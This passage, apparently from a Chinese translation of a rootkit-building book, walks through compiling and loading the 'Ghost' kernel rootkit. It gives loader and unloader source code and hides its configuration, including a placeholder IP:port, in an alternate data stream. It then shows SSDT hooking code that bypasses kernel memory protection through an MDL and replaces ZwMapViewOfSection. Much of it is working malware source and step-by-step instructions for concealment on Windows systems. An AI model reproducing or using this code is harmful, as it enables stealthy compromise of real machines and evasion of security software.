if ( !sh2 )
{
if ( GetLastError() == ERROR_SERVICE_EXISTS )
printf("DeviceDriver already loaded!\n");
else
printf("CreateService Failed!\n");
}
else
{
printf("\nDriver loaded!\n");
}
}
在介绍了内核模式编程后，用户模式下编程看起来要相对简单一些。可以想传递参数一
样增加本地驱动程序，因此你不必重新编译每个新的 rootkit。对于我们来说简单是最重要的，
因此我们的 rootkit 采用的是硬编码编程。
如果你有编译工作环境，你可以打开一个命令提示符窗口来编译 SCMLoader.c。如果你
配置了你的开发环境，使工作目录中包含 SCMLoader.c 并输入下面命令来编译程序：
cl -nologo -W3 -O2 SCMLoader.c /link /NOLOGO user32.lib advapi32.lib
如果前面的命令没有成功编译出 SCMLoader.exe，你可能需要修改你的编译环境。大多
数的编译环境问题可以使用 VCVARS32.BAT 来解决。如果你找到了你的 C/C++编译器的安
装目录(通常在 C:\Program Files 目录下)，你将可能找到一个名为 VCVARS32.BAT 的文件。
这个文件用来为特殊编译器设置一个命令提示符窗口。如果在编译 rootkit 前将该文件复制
到 rootkit 目录并执行它，可能会解决一些出乎意料的问题。
不要试图从驱动开发包编译环境创建一个用户编译环境。您在第一章的操作简化了
“Checked DDK”，使之能够用来编译设备驱动程序。在这种环境下运行 VCVARS32.BAT 将
只会破坏命令提示符窗口，防止编译种遇到的种种问题。
如果 VCVARS32.BAT 没有解决所有出乎意料的问题，或者你没有找到它，你需要查看
每一个编译和连接错误已确定导致问题的根本原因。错误是以“Can’t find”开始，则问题可以
追述到全局 LIB 和 INCLUDE 环境变量(例如“Can’t find xxx.lib = LIB”和“Can’t find xxx.h =
INCLUDE”)。你可以搜索你的 C/C++编译器的安装目录来确定那些没有被定位的文件。一
旦找到，你可以修改你的环境变量(LIB 和 INCLUDE)使之包含该路径的文件。
修改环境变量。左击开始(通常在屏幕左下角)并在弹出菜单中右击我的电脑。从弹出列
表中选择属性。在属性对话框中选择高级页。在高级页中点击环境变量按钮。在其中一个列
表中(用户变量和系统变量)你会看到 LIB 和 INCLUDE 变量。
修改任一环境变量。双击相关条目并添加所发现文件的路径。记得要用分号分隔所有路
径。添加完毕所有路径后点击 OK 关闭每个窗口并保存所有新设置。关闭所有打开的命令提
示符窗口，重新打开使设置生效。
如 果 你 编 译 成 功 了 ， 你 应 该 将 编 译 命 令 保 存 在 一 个 文 件 中 。 我 将 它 命 名 为
buildSCMLoader.bat。
如果您一直跟着做，你会注意到在加载 rootkit 前似乎有一个多余的步骤：你仍然需要
创建配置文件。当然，虽然除了作为一个交换数据流隐藏 rootkit 基本不起任何作用，但是
它是加载所必须的。
你可以在 DOS 命令提示符窗口输入命令“echo 123.456.789.012:01234 > c:\config32”来创
建 这 个 必 要 的 配 置 文 件 。 或 者 你 也 可 以 使 用 你 自 己 的 IP 地 址 和 80 端 口 ( 例 如 ，
127.000.000.001:00080) 来为跟踪 rootkits 的章节做准备。不管哪一种情况，这个格式必须是
一样的。目前的 Ghost 工具不能处理一个像“127.0.0.1:80.”这样的无格式字符串。如果你已经
编译出了加载程序并且创建了配置文件，你所需要做的只是将 rootkit 移到 c:\comint32.sys，
执行 SCMLoader，并使用命令“net start MyDeviceDriver.”来开始运行 rootkit。如果一切顺利，
你将看到输出信息“Driver loaded!”，如果你打开了 DebugView 工具，你也可以看到从你的
rootkit 输出的 debug 调试信息 comint32。
图 2-4 所示加载和卸载 rootkit。图 2-5 所示 DebugView 输出信息。
图 2-4
图 2-5
恭喜你！你已经成功的加载并运行了你的 rootkit。
加载程序 SCMLoader 创建了一个注册信息条目，将使您的 rootkit 伴随启动进程被重新
加载。幸运的是，rootkit 伴随开始选项被初始化，因此直到您输入“net start MyDeviceDriver”
命令，rootkit 都不会开始运行。您可以通过删除 c:\comint32.sys 文件或删除注册表键值
HKEY_LOCAL_MACHINE\SYSTEM\ CurrentControlSet\Services\MyDeviceDriver 来停止加
载进程。然而，你不想删除文件或注册表信息，也不希望每次修改 rootkit 后都要重启系统
才能生效。因此你需要一个卸载程序。下面的文件和相应的编译命令可以用来创建
SCMUnloader。使用 SCMLoader 和 SCMUnloader (命令“net start MyDeviceDriver”和“net stop
MyDeviceDriver”)交替切换。另外，记住当 config32 被读取后你可以删除它；当 config32 不
存在时将查找交替数据流中的信息。
SCMUnloader.c
SCMUnloader.c
SCMUnloader.c
SCMUnloader.c
SCMUnloader 程序代码如下：
// Copyright Ric Vieler, 2006
// This program will unload c:\comint32.sys
#include 
#include 
#include 
void main( int argc, char *argv[ ] )
{
SC_HANDLE sh1;
SC_HANDLE sh2;
SERVICE_STATUS ss;
sh1 = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
if ( !sh1 )
{
printf( "OpenSCManager Failed!\n" );
return;
}
sh2 = OpenService(sh1,
"MyDeviceDriver",
SERVICE_ALL_ACCESS );
if ( !sh2 )
{
printf("OpenService Failed!\n");
CloseServiceHandle( sh1 );
exit(1);
}
ControlService( sh2, SERVICE_CONTROL_STOP, &ss );
if ( !DeleteService( sh2 ) )
printf("Could not unload MyDeviceDriver!\n");
else
printf("Unloaded MyDeviceDriver.\n");
CloseServiceHandle( sh2 );
CloseServiceHandle( sh1 );
}
编译命令如下：
cl -nologo -W3 -O2 SCMUnloader.c /link /NOLOGO user32.lib advapi32.lib
测试你的 Rootkit
Rootkit
Rootkit
Rootkit
现在你可以加载、卸载、开始和停止一个基本的 rootkit，在这章你可以逐项的测试各项
rootkit 技术了。
第一个测试需要一个系统管理员工具，它可以列出操作系统中目前所有正在运行的设备
驱动程序。完成这个任务的标准工具是 drivers.exe。这个实用的工具是大多数微软操作系统
资源包所配备的，也是大多数驱动程序开发包所必备的。不加任何参数运行这个程序将列出
所有正在运行的设备驱动程序。加载和启动 MyDeviceDriver 将不会在驱动程序列表中增加
预期的 comint32.sys。
第二个测试将要验证交替数据流增加到了 C:\Windows\Resources 中。最简单的测试这个
功能的方法是删除 C:\config32，停止并重启 MyDeviceDriver。因为 config32 已经不再存在
了，rootkit 就必须重新从交替数据流中获取配置信息。这一点可以通过使用 DebugView 来
有效的证明。Debug 调试输出信息应该包括初始的 GetFile()失败信息；这是企图读取
C:\config32 文件所造成的。然后，debug 调试输出信息会提示“Reading config from hidden file.”
从交替数据流读取的 IP 和 port 信息也将被显示。
总结
本章内容比较繁杂，但这只是开始。到现在为止我们开发的 rootkit 还只能隐藏其配置文件
和在操作系统中隐藏驱动程序条目信息。一些其他需要考虑的是如何实现真正的隐藏。例如，
使用服务控制管理器注册 rootkit，注册信息条目可被任何注册表编辑器查看到。Ghost 使用
了一个迷惑性的名字“comint32”来达到真正隐藏的母的，但是我们还需要更好的隐藏技术。
你的 rootkit 还需要具有隐藏文件、驱动、进程、注册表信息等功能。通过一些技术可以达
到这样的目标，这样的技术很多，我只简单介绍几个，如：进程隐藏技术、驱动隐藏技术、
文件隐藏技术、注册表键隐藏技术、通讯频道隐藏技术、你也可以编写一个 rootkit 并使其
运行与操作系统的内存中。
我们现在可以编写出一个具有如下功能的 rootkit：
隐藏设备驱动程序条目信息
隐藏配置文件
虽然功能不是很多，但这只是长途旅行的开始；第一步是最难的。下面的章节将为这个
rootkit 增加更多的功能。下一章将增加一个 rootkit 至关重要的部分：内核函数钩子。
笫三章 内核钩子
概述
本章将带领大家创建一个内核钩子。内核函数为操作系统高级应用程序提供了运行系统
操作所必须的低级函数。通过挂钩内核，一个 rootkit 可以使用高级应用程序来改变低级操
作。这样就提供了一个便于控制、监视、过滤和提供一些隐藏可能的机制。
本章包括如下内容：
系统调用表
内存保护机制
内核挂钩指令
内核挂钩函数
一个基本内核钩子的例子
关于内核函数的描述
系统调用表
Windows 内核依赖一个函数指针列表来实现系统操作。这个表相当于被 Microsoft 作为
系统服务列表或服务描述列表，它可以被修改指向用户指定的函数。挂钩这些系统函数就是
本章的焦点。
参考 DDK，KeServiceDescriptorTable，提供了一些核心级的进程允许进入系统调用表，
但是修改系统调用表和替换核心函数不是一个简单的任务。本章介绍通过系统调用表访问这
些函数并给你一些资源来替换这些核心函数。
系统调用表中有一些条目，它们可以将操作由简单字符串操作指向复杂 C/S 操作，因此
不要奢望一个晚上就了解系统调用表的全部范围。然而，记住你可以学习更多的系统调用表
所涉及的函数，为你实现内核挂钩做好更充分的准备。
内核内存保护机制
在挂钩内核函数之前，需要考虑的是设备防修改机制。目前的 Windows 操作系统能够
通过将系统调用表设置为只读来保护核心内存。如果不完全的获得它会阻止内核挂钩。内存
描述列表如图 3-1 所示。
Figure 3-1
获得被保护的内存的关键在于内存描述表，在微软 Windows 驱动开发包的 ntddk.h 文
件中被定义。下面是该文件中的定义：
typedef struct _MDL {
struct _MDL *Next;
CSHORT Size;
CSHORT MdlFlags;
struct _EPROCESS *Process;
PVOID MappedSystemVa;
PVOID StartVa;
ULONG ByteCount;
ULONG ByteOffset;
} MDL, *PMDL;
#define MDL_MAPPED_TO_SYSTEM_VA 0x0001
#define MDL_PAGES_LOCKED 0x0002
#define MDL_SOURCE_IS_NONPAGED_POOL 0x0004
#define MDL_ALLOCATED_FIXED_SIZE 0x0008
#define MDL_PARTIAL 0x0010
#define MDL_PARTIAL_HAS_BEEN_MAPPED 0x0020
#define MDL_IO_PAGE_READ 0x0040
#define MDL_WRITE_OPERATION 0x0080
#define MDL_PARENT_MAPPED_SYSTEM_VA 0x0100
#define MDL_FREE_EXTRA_PTES 0x0200
#define MDL_IO_SPACE 0x0800
#define MDL_NETWORK_HEADER 0x1000
#define MDL_MAPPING_CAN_FAIL 0x2000
#define MDL_ALLOCATED_MUST_SUCCEED 0x4000
#define MDL_MAPPING_FLAGS (MDL_MAPPED_TO_SYSTEM_VA | \
MDL_PAGES_LOCKED | \
MDL_SOURCE_IS_NONPAGED_POOL | \
MDL_PARTIAL_HAS_BEEN_MAPPED | \
MDL_PARENT_MAPPED_SYSTEM_VA | \
MDL_SYSTEM_VA | \
MDL_IO_SPACE )
内存描述表(MDLs)是用来将虚拟内存映射到物理页的。如果内存描述表中的内存地址
的系统调用表的系统描述表标志位设为 MDL_MAPPED_TO_SYSTEM_VA 并且物理页被锁
定，那么内核挂钩可以实现。下面的代码段将达到这个结果：
#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
unsigned int *ServiceTableBase;
unsigned int *ServiceCounterTableBase;
unsigned int NumberOfServices;
unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
PVOID* NewSystemCallTable;
PMDL pMyMDL = MmCreateMdl( NULL,
KeServiceDescriptorTable.ServiceTableBase,
KeServiceDescriptorTable.NumberOfServices * 4 );
MmBuildMdlForNonPagedPool( pMyMDL );
pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );
现在挂钩时你可以使新的系统调用表（NewSystemCallTable）。图 3-2 所示系统调用表。
Figure 3-2
可以考虑使用下面的宏指令来挂钩：
#define HOOK_INDEX(function2hook) *(PULONG)((PUCHAR)function2hook+1)
#define HOOK(functionName, newPointer2Function, oldPointer2Function )
\
oldPointer2Function = (PVOID) InterlockedExchange( (PLONG)
&NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) newPointer2Function)
#define UNHOOK(functionName, oldPointer2Function)
\
InterlockedExchange(
(PLONG)
&NewSystemCallTable[HOOK_INDEX(functionName)],
(LONG)
oldPointer2Function)
图 3-3 所示挂钩系统调用表。
Figure 3-3
KeServiceDescriptorTable(系统调用表)数据结构包含所有 ntdll.dll 函数指针并提供需要
创 建 你 自 己 内 存 描 述 表 的 基 地 址 和 表 大 小 。 如 果 你 创 建 了 一 个 带 有
MDL_MAPPED_TO_SYSTEM_VA 标志的无页内存描述表，你可以锁定它并返回地址作为
你自己的(可写的)系统调用表。
使用#defines 来让挂钩变得安全和容易。由于 InterlockedExchange，使得指针交换方式
更安全，一个不需要暂停和终端的基本函数，什么能比使用宏指令挂钩和卸载挂钩要更容易
呢？
定义一个挂钩函数
内核挂钩的基本部分就是函数挂钩，替换被函数的函数和系统调用表。前面一节已经已
经给大家讲了所需要使用的宏指令，但是你仍然需要定义替换被挂钩函数的函数和用来储存
原函数地址的函数指针。大多数情况下，你可以在 DDK 头文件中找到函数原型。举个例子
来说，下面这个函数原型是在 ntddk.h 的，经修改变为替换被挂钩函数的函数。
下面是 ntddk.h 定义的原始形式:
NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect );
因此，下面所示挂钩原函数的指针：
typedef NTSTATUS (*ZWMAPVIEWOFSECTION)(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect );
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
下面所示为替换被挂钩函数的原函数：
NTSTATUS NewZwMapViewOfSection(
IN HANDLE SectionHandle,
IN HANDLE ProcessHandle,
IN OUT PVOID *BaseAddress,
IN ULONG ZeroBits,
IN ULONG CommitSize,
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
IN OUT PSIZE_T ViewSize,
IN SECTION_INHERIT InheritDisposition,
IN ULONG AllocationType,
IN ULONG Protect )
{
NTSTATUS status;
DbgPrint("comint32: NewZwMapViewOfSection called.");
// we can do whatever we want with the input here
// and return or continue to the original function
status = OldZwMapViewOfSection(SectionHandle,
ProcessHandle,
BaseAddress,
ZeroBits,
CommitSize,
SectionOffset OPTIONAL,
ViewSize,
InheritDisposition,
AllocationType,
Protect );
// we can do whatever we want with the output here
// and return any value including the actual one
return status;
}
如果这些被定义了，你可以使用下面这些：
HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );
如果你使用了 DriverUnload()，注意一定要卸载钩子。
提示：
ZwMapViewOfSection 是内核函数，它允许允许应用程序将动态链接库的输出函数映射到内
存中。挂钩这个函数来改变 DLL 函数的映射被称作进程注入或用户模式挂钩，这是第四章
需要探讨的话题。
一个实例
需要挂钩内核系统调用表的功能已经可以通过新建两个文件再修改已存在的两个文件
的方法来实现。本书涉及的所有文件和在网上下载得到。
下面是新文件：
hookManager.c
hookManager.h
下面是被修改文件：
Ghost.c
SOURCES
代码如下节所示。
SOURCES
SOURCES
SOURCES
SOURCES 文件
将 hookManager.c 增加到 SOURCES 文件:
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
fileManager.c\
hookManager.c\
configManager.c
Ghost.c
Ghost.c
Ghost.c
Ghost.c
Ghost.c 文 件 中 增 加 了 三 个 新 的 全 局 变 量 : NewSystemCallTable, pMyMDL, 和
OldZwMapViewOfSection。其中，NewSystemCallTable 和 pMyMDL 是用来获得修改内存保
护的，OldZwMapViewOfSection 来保存原始 ZwMapViewOfSection 地址。值得注意的是在系
统重启时原始的 ZwMapViewOfSection 可能不是系统调用表中原来的地址。这个地址可能来
自另一个 rootkit 或安全软件。
DriverUnload 函数被修改为卸载挂钩 ZwMapViewOfSection 并返回 MDL。另外，在一
个实际运行环境中 DriverUnload 可能不是必须的，但是在一个开发环境中它是很有用的。